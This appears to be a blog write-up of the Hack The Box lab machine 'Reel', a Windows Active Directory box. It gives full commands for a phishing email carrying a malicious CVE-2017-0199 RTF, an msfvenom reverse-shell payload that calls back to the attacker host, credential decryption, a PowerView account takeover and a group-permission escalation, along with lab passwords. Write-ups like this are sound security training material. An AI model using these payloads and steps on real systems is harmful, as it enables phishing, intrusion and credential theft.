---
"title": "Hack The Box - Reel"
"date": 2020-08-28
"tags": ["windows", "hard", "AD", "PSCreds", "CliXml", "phishing", "WriteOwner", "WriteDacl",
  "icacls"]
"keywords": ["windows", "hard", "AD", "PSCreds", "CliXml", "phishing", "WriteOwner",
  "WriteDacl", "icacls"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Really a good AD box, We need to do Phishing attack to get the initial shell and 1st user has WriteOwner Permission over another user. And 2nd User has some WriteDacl permission over a Group which has permission to access the Administrator directory."
"featured_image": "/img/htb-reel/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-reel/Untitled.png)

Really a good AD box, We need to do Phishing attack to get the initial shell and 1st user has WriteOwner Permission over another user. And 2nd User has some WriteDacl permission over a Group which has permission to access the Administrator directory.

Link: [https://www.hackthebox.eu/home/machines/profile/143](https://www.hackthebox.eu/home/machines/profile/143)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       [DIR](DIR)          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.80%I=7%D=8/25%Time=5F450F48%P=x86_64-pc-linux-gnu%r(NULL
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20S
SF:ervice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%
SF:r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EH
SF:LO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n"
SF:)%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20
SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\
SF:r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad
SF:\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comma
SF:nds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVer
SF:sionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusReq
SF:uestTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"2
SF:20\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20
SF:Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerbero
SF:s,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mai
SF:l\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20re
SF:ady\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")
SF:%r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindRe
SF:q,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Ma
SF:il\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n5
SF:03\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of
SF:\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequenc
SF:e\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\
SF:x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x2
SF:0commands\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m43s, deviation: 34m37s, median: 15s
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2020-08-25T14:20:18+01:00
| smb-security-mode: 
|   account_used: [blank](blank)
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-08-25T13:20:21
|_  start_date: 2020-08-25T13:08:26

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   209.64 ms 10.10.14.1
2   209.67 ms 10.10.10.77
```

## FTP Enumeration

Started my enumeration from FTP, and I logged in anonymously. There is a directory called `documents` and it has 3 files, so I downloaded them all to my machine.

```bash
root@kali:~/CTF/HTB/Boxes/Reel# ftp 10.10.10.77
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       [DIR](DIR)          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
ftp> mget *
mget AppLocker.docx? 
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 9 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
2047 bytes received in 0.27 secs (7.5368 kB/s)
mget readme.txt? 
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
124 bytes received in 0.27 secs (0.4462 kB/s)
mget Windows Event Forwarding.docx? 
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 51 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
```

`readme.txt` This file gives us a hint, We need to send an email in RTF format file.

```bash
root@kali:~/htb/boxes/reel# cat readme.txt
please email me any rtf format procedures - I’ll review and convert.

new format / converted documents will be saved here.
```

**What is RTF?** 

RTF is a text file format used by Microsoft products, such as Word and Office. RTF, or Rich Text Format, files were developed by Microsoft in 1987 for use in their products and for cross-platform document interchange. RTF is readable by most word processors.

While looking at those files, I checked the Exif and I got a valid mail address.

```bash
root@kali:~/htb/boxes/reel# exiftool Windows\ Event\ Forwarding.docx 
ExifTool Version Number         : 12.04
File Name                       : Windows Event Forwarding.docx
Directory                       : .
File Size                       : 14 kB
File Modification Date/Time     : 2020:08:25 09:17:35-04:00
File Access Date/Time           : 2020:08:25 09:17:34-04:00
File Inode Change Date/Time     : 2020:08:25 09:17:35-04:00
File Permissions                : rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm
Total Edit Time                 : 5 minutes
Pages                           : 2
Words                           : 299
Characters                      : 1709
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 14
Paragraphs                      : 4
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : 
Links Up To Date                : No
Characters With Spaces          : 2004
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 14.0000
```

Since we know from the readme.txt, they expecting an RTF format document that needs to be sent through the mail. So I searched for exploits and found this repo. This module creates a malicious RTF file that when opened in vulnerable versions of Microsoft Word will lead to code execution. 

> [https://github.com/bhdresh/CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)

## Getting User Shell

First, I used `msfvenom` to generate an HTA file that will give me a reverse shell.

```bash
root@kali:~/htb/boxes/reel/CVE-2017-0199# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.30 LPORT=1234 -f hta-psh -o shell.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 6592 bytes
Saved as: shell.hta
```

Next I will create the RTF file.

```bash
root@kali:~/CTF/HTB/Boxes/Reel/CVE-2017-0199# python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://10.10.14.16/shell.hta -x 0
Generating normal RTF payload.

Generated Invoice.rtf successfully
```

- `-M gen` - generate a document
- `-w Invoice.rtf` - RTF File
- `-u` - URL of the HTA file
- `-x 0` - Disabled rtf obfuscation

Now time to send the mail with our malicious RTF file. And I attached the RTF file and send to the `nico@megabank.com`

```bash
root@kali:~/CTF/HTB/Boxes/Reel/CVE-2017-0199# swaks --server 10.10.10.77 --from wolf@megabank.com --to nico@megabank.com  --header 'Subject:Please Review this' --attach Invoice.rtf 
=== Trying 10.10.10.77:25...
=== Connected to 10.10.10.77.
<-  220 Mail Service ready
 -> EHLO kali
<-  250-REEL
<-  250-SIZE 20480000
<-  250-AUTH LOGIN PLAIN
<-  250 HELP
 -> MAIL FROM:[wolf@megabank.com](wolf@megabank.com)
<-  250 OK
 -> RCPT TO:[nico@megabank.com](nico@megabank.com)
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Tue, 11 Aug 2020 21:41:34 +0530
 -> To: nico@megabank.com
 -> From: wolf@megabank.com
 -> Subject:Please Review this
 -> Message-Id: [20200811214134.007039@kali](20200811214134.007039@kali)
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_7039"
 -> 
 -> ------=_MIME_BOUNDARY_000_7039
 -> Content-Type: text/plain
 -> 
 -> This is a test mailing
 -> ------=_MIME_BOUNDARY_000_7039
 -> Content-Type: application/octet-stream; name="Invoice.rtf"
 -> Content-Description: Invoice.rtf
 -> Content-Disposition: attachment; filename="Invoice.rtf"
 -> Content-Transfer-Encoding: BASE64
 -> 
.
.
.
.
 -> 
 -> ------=_MIME_BOUNDARY_000_7039--
 -> 
 -> 
 -> .
<-  250 Queued (12.141 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

In a few seconds, I got a hit on my python server.

```bash
root@kali:~/CTF/HTB/Boxes/Reel/CVE-2017-0199# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.77 - - [11/Aug/2020 21:41:58] "GET /shell.hta HTTP/1.1" 200 -
```

And I got a shell

![Untitled](/img/htb-reel/Untitled%201.png)

## PrivEsc → Tom

When I got through the files and Found encrypted password of user `tom` and they use Powershell's PSCredential, which provides a method to store usernames, passwords, and credentials. There are also two functions, Import-CliXml and Export-CliXml , which are used to save these credentials and restore them from a file.

```bash
Directory of C:\Users\nico\Desktop

28/05/2018  21:07    [DIR](DIR)          .
28/05/2018  21:07    [DIR](DIR)          ..
28/10/2017  00:59             1,468 cred.xml
28/10/2017  00:40                32 user.txt
               2 File(s)          1,500 bytes
               2 Dir(s)  15,769,726,976 bytes free

C:\Users\nico\Desktop>type cred.xml
type cred.xml
[Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"](Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04")
  [Obj RefId="0"](Obj RefId="0")
    [TN RefId="0"](TN RefId="0")
      [T](T)System.Management.Automation.PSCredential[/T](/T)
      [T](T)System.Object[/T](/T)
    [/TN](/TN)
    [ToString](ToString)System.Management.Automation.PSCredential[/ToString](/ToString)
    [Props](Props)
      [S N="UserName"](S N="UserName")HTB\Tom[/S](/S)
      [SS N="Password"](SS N="Password")01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692[/SS](/SS)
    [/Props](/Props)
  [/Obj](/Obj)
[/Objs](/Objs)
```

Reference:

- [https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx)

I googled about how to decrypt it and found this link and `$cred=Import-CliXml -Path [file](file); $cred.GetNetworkCredential().Password` this is the command which helps to decrypt.

```bash
C:\Users\nico\Desktop>powershell.exe -c "$cred=Import-CliXml -Path C:\Users\nico\Desktop\cred.xml; $cred.GetNetworkCredential().Password"
powershell.exe -c "$cred=Import-CliXml -Path C:\Users\nico\Desktop\cred.xml; $cred.GetNetworkCredential().Password"
1ts-mag1c!!!
```

We Know Port 22 is Open, So I used the password to Login.

![Untitled](/img/htb-reel/Untitled%202.png)

Once I logged in, I uploaded SharpHound and collected all the information's needed BloodHound and downloaded it to my machine.

Imported the ZIP file to BloodHound, While going through all the Queries, I came to know TOM have WriteOwner Permission again CLAIRE user.

![Untitled](/img/htb-reel/Untitled%203.png)

## PrivEsc → Claire

To get claire account, We can use the WriteOwner permission along with the functionality of PowerView.

- WriteOwner - change object owner to attacker controlled user take over the object

Steps:

- First we became the owner of Claire's ACL
- Then We get Reset Password Permission
- And use that permission to change it.

```bash
PS C:\Users\tom> certutil -urlcache -split -f http://10.10.14.30/PowerView.ps1              
****  Online  ****                                                                          
  000000  ...                                                                               
  0bc0e7                                                                                    
CertUtil: -URLCache command completed successfully.                                         
PS C:\Users\tom> Import-Module .\PowerView.ps1                                              
PS C:\Users\tom> Set-DomainObjectOwner -identity claire -OwnerIdentity tom                            
PS C:\Users\tom> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword                                                                                
PS C:\Users\tom> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force   
PS C:\Users\tom> Set-DomainUserPassword -identity claire -accountpassword $SecPassword      
```

Password Changed successfully.

And Im logged in SSH as Claire now.

![Untitled](/img/htb-reel/Untitled%204.png)

## PrivEsc → Backup_Admins

While checking about Claire. I got to know she has one `First Degree Object Control` which means she has control directly over Backup_Admins.

![Untitled](/img/htb-reel/Untitled%205.png)

Since we have WriteDacl rights on the Backup_Admins group. I can use that to add her to the group.

Added her to that group.

```bash
PS C:\Users\claire> net group "Backup_Admins" claire /add /domain                                                               
The command completed successfully.                                                                                             

PS C:\Users\claire> net user claire                                                                                             
User name                    claire                                                                                             
Full Name                    Claire Danes                                                                                       
Comment                                                                                                                         
User's comment                                                                                                                  
Country/region code          000 (System Default)                                                                               
Account active               Yes                                                                                                
Account expires              Never                                                                                              

Password last set            8/25/2020 3:37:32 PM                                                                               
Password expires             Never                                                                                              
Password changeable          8/26/2020 3:37:32 PM                                                                               
Password required            Yes                                                                                                
User may change password     Yes                                                                                                

Workstations allowed         All                                                                                                
Logon script                                                                                                                    
User profile                                                                                                                    
Home directory                                                                                                                  
Last logon                   8/25/2020 3:34:04 PM                                                                               

Logon hours allowed          All                                                                                                

Local Group Memberships      *Hyper-V Administrator                                                                             
Global Group memberships     *Backup_Admins        *Domain Users                                                                
                             *MegaBank_Users       *DR_Site                                                                     
                             *Restrictions                                                                                      
The command completed successfully.
```

## PrivEsc → Administrator

After some enumeration, I came to know Backup_Admins have access over Administrator Directory.

```bash
claire@REEL C:\Users>icacls Administrator                                                                                       
Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)                                                                                   
              HTB\Backup_Admins:(OI)(CI)(F)                                                                                     
              HTB\Administrator:(OI)(CI)(F)                                                                                     
              BUILTIN\Administrators:(OI)(CI)(F)                                                                                

Successfully processed 1 files; Failed processing 0 files
```

- F - Full access

I entered into the directory. Still I can't read the root flag.

```bash
claire@REEL C:\Users>cd Administrator                                                                                           

claire@REEL C:\Users\Administrator>dir                                                                                          
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of C:\Users\Administrator                                                                                            

02/17/2018  12:29 AM    [DIR](DIR)          .                                                                                        
02/17/2018  12:29 AM    [DIR](DIR)          ..                                                                                       
10/28/2017  12:14 AM    [DIR](DIR)          .config                                                                                  
10/28/2017  12:28 AM    [DIR](DIR)          .oracle_jre_usage                                                                        
10/28/2017  12:00 AM    [DIR](DIR)          Contacts                                                                                 
01/21/2018  03:56 PM    [DIR](DIR)          Desktop                                                                                  
05/29/2018  10:19 PM    [DIR](DIR)          Documents                                                                                
02/17/2018  12:29 AM    [DIR](DIR)          Downloads                                                                                
10/28/2017  12:00 AM    [DIR](DIR)          Favorites                                                                                
10/28/2017  12:00 AM    [DIR](DIR)          Links                                                                                    
10/28/2017  12:00 AM    [DIR](DIR)          Music                                                                                    
10/26/2017  09:20 PM    [DIR](DIR)          OneDrive                                                                                 
10/31/2017  10:38 PM    [DIR](DIR)          Pictures                                                                                 
10/28/2017  12:00 AM    [DIR](DIR)          Saved Games                                                                              
10/28/2017  12:00 AM    [DIR](DIR)          Searches                                                                                 
10/28/2017  12:00 AM    [DIR](DIR)          Videos                                                                                   
               0 File(s)              0 bytes                                                                                   
              16 Dir(s)  15,761,108,992 bytes free
```

There is a `Backup Scripts` directory, I checked those files and `BackupScript.ps1` contains a password.

```bash
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir                                                                   
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of C:\Users\Administrator\Desktop\Backup Scripts                                                                     

11/02/2017  10:47 PM    [DIR](DIR)          .                                                                                        
11/02/2017  10:47 PM    [DIR](DIR)          ..                                                                                       
11/04/2017  12:22 AM               845 backup.ps1                                                                               
11/02/2017  10:37 PM               462 backup1.ps1                                                                              
11/04/2017  12:21 AM             5,642 BackupScript.ps1                                                                         
11/02/2017  10:43 PM             2,791 BackupScript.zip                                                                         
11/04/2017  12:22 AM             1,855 folders-system-state.txt                                                                 
11/04/2017  12:22 AM               308 test2.ps1.txt                                                                            
               6 File(s)         11,903 bytes                                                                                   
               2 Dir(s)  15,761,108,992 bytes free                                                                              

claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                                 
# admin password                                                                                                                
$password="Cr4ckMeIfYouC4n!"
```

Used the password to login in to SSH as Administrator.

![Untitled](/img/htb-reel/Untitled%206.png)

We own the Box